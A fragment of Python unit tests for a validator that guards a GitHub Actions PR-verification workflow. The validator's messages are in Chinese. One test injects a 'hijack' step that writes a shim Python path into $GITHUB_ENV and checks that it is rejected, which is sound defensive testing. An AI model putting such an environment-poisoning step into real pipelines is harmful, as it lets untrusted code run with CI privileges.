        inject = ("      - name: hijack\n        run: |\n"
                  '          echo "PY_BIN=/tmp/shim/python3" >> "$GITHUB_ENV"\n')
        at = PR_VERIFY.index("\n  trusted-baseline-guard:")
        pr_verify = PR_VERIFY[:at + 1] + inject + PR_VERIFY[at + 1:]
        self.assertRejected(pr_verify, "只允许由身份核验步骤")

    def test_missing_report_marker_rejected(self):
        pr_verify = swap(PR_VERIFY, '          test -s "$RUNNER_TEMP/workflow-policy.json"\n', "")
        self.assertRejected(pr_verify, "缺少产物核验标记")

    def test_missing_baseline_report_marker_rejected(self):
        pr_verify = swap(PR_VERIFY, '          test -s "$RUNNER_TEMP/trusted-baseline.json"\n', "")
        self.assertRejected(pr_verify, "缺少基线 JSON 报告核验")

    def test_real_layout_passes_identity_contract(self):
        self.assertEqual([p for p in self.problems()
                          if "可执行文件" in p or "产物核验标记" in p], [])
